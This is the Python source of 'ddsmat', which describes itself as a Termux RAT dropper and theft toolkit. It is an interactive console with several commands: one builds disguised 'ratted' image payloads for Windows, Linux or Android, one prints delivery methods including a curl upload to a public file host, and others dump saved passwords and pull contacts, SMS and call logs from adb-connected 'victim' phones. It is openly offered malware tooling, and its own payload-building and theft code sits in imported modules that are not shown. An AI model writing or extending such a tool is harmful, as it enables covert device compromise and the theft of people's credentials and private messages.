#!/usr/bin/env python3
# ddsmat/ddsmat.py
"""
ddsmat — termux RAT dropper + phone/steal toolkit.

Run:  python ddsmat.py
Then: /help
"""
import os
import sys
import shlex
import time
import readline  # arrow keys / history
from pathlib import Path

import adb
import builds

BASE = Path(__file__).parent
DROPS = BASE / "drops"
BUILDS = BASE / "builds"
DROPS.mkdir(exist_ok=True)
BUILDS.mkdir(exist_ok=True)

BANNER = r"""
   ___  ___  ___  __  __    _  _____
  |   \|   \/ __|  \/  |   /_\|_   _|
  | |) | |) \__ \ |\/| |  / _ \ | |
  |___/|___/|___/_|  |_| /_/ \_\|_|

  ddsmat — /help for commands
"""


# ------------------------------------------------------------------
def cmd_help(_):
    print("""
ddsmat commands:

  /image <path> <name> [target]   build a ratted image payload
                                  target: windows (default) | linux | android
  /link  <file>                   print delivery options for a file
  /steal [victim]                 dump saved passwords (adb target)
  /phone <victim> [what]          pull contacts/sms/calls
                                  what: all (default) | contacts | sms | calls
  /victims                        list adb-connected devices
  /ls                             list built payloads
  /open <name>                    print absolute path of a built payload
  /help                           this
  /exit                           quit
""")


def cmd_image(args):
    """ /image <path> <name> [target] """
    if len(args) < 2:
        print("usage: /image <path> <name> [windows|linux|android]")
        return
    src = Path(args[0]).expanduser()
    name = args[1]
    target = args[2] if len(args) > 2 else "windows"

    if not src.exists():
        print(f"no such file: {src}")
        return
    if target not in ("windows", "linux", "android"):
        print("target must be windows, linux, or android")
        return

    print(f"[ddsmat] building {target} payload from {src.name} …")
    try:
        out, display = builds.build(src, name, target, BUILDS)
    except Exception as e:
        print(f"[ddsmat] build failed: {e}")
        return

    print(f"[ddsmat] built: {out}")
    print(f"[ddsmat] display name: {display}")
    print(f"[ddsmat] size: {out.stat().st_size / 1024:.1f} KB")
    print()
    print(f"to share:  /link {out}")
    print(f"the payload wears '{src.name}' as its icon.")
    print(f"victim downloads '{display}' and opens it.")


def cmd_link(args):
    if not args:
        print("usage: /link <file>")
        return
    p = Path(args[0]).expanduser()
    if not p.exists():
        print(f"no such file: {p}")
        return

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        lan_ip = s.getsockname()[0]
    except Exception:
        lan_ip = "127.0.0.1"
    finally:
        s.close()

    port = 8080
    print(f"[ddsmat] delivery options for '{p.name}':")
    print()
    print("1) termux share sheet:")
    print(f"     termux-share -a send {p}")
    print()
    print(f"2) local http server (same wifi only):")
    print(f"     cd {p.parent} && python -m http.server {port}")
    print(f"     link: http://{lan_ip}:{port}/{p.name}")
    print()
    print("3) upload to a host you control:")
    print(f"     curl -F 'file=@{p}' https://0x0.st")


def cmd_steal(args):
    victim = args[0] if args else None
    print(f"[ddsmat] steal{' → ' + victim if victim else ' (all adb targets)'}")
    out = adb.steal(victim)
    print(out)


def cmd_phone(args):
    if not args:
        print("usage: /phone <victim> [all|contacts|sms|calls]")
        return
    victim = args[0]
    what = args[1] if len(args) > 1 else "all"
    print(f"[ddsmat] phone pull {victim} ({what})")
    out = adb.phone(victim, what)
    print(out)


def cmd_victims(_):
    out = adb.list_devices()
    if not out:
        print("no adb devices attached.")
        print("enable USB debugging on target + connect cable, or:")
        print("   adb connect <ip>:5555")
        return
    print("connected devices:")
    for d in out:
        print(f"  {d}")


def cmd_ls(_):
    files = sorted(BUILDS.glob("*"))
    files = [f for f in files if f.is_file() and not f.name.startswith(".")]
    if not files:
        print("no builds yet.")
        return
    print(f"builds in {BUILDS}:")
    for f in files:
        print(f"  {f.name}  ({f.stat().st_size/1024:.1f} KB)")


def cmd_open(args):
    if not args:
        print("usage: /open <name>")
        return
    p = BUILDS / args[0]
    if not p.exists():
        matches = list(BUILDS.glob(f"*{args[0]}*"))
        if matches:
            p = matches[0]
        else:
            print(f"no build matching {args[0]}")
            return
    print(p.resolve())


def cmd_exit(_):
    print("bye.")
    sys.exit(0)


COMMANDS = {
    "/help":    cmd_help,
    "/image":   cmd_image,
    "/link":    cmd_link,
    "/share":   cmd_link,
    "/steal":   cmd_steal,
    "/phone":   cmd_phone,
    "/victims": cmd_victims,
    "/ls":      cmd_ls,
    "/open":    cmd_open,
    "/exit":    cmd_exit,
    "/quit":    cmd_exit,
}


# ------------------------------------------------------------------
def main():
    print(BANNER)
    while True:
        try:
            line = input("ddsmat> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        if not line.startswith("/"):
            if line.startswith("!"):
                os.system(line[1:])
                continue
            print("commands start with '/'  (try /help)")
            continue

        parts = shlex.split(line)
        cmd, args = parts[0], parts[1:]
        handler = COMMANDS.get(cmd)
        if not handler:
            print(f"unknown: {cmd}  (try /help)")
            continue
        try:
            handler(args)
        except Exception as e:
            print(f"[ddsmat] error: {e}")


if __name__ == "__main__":
    main()
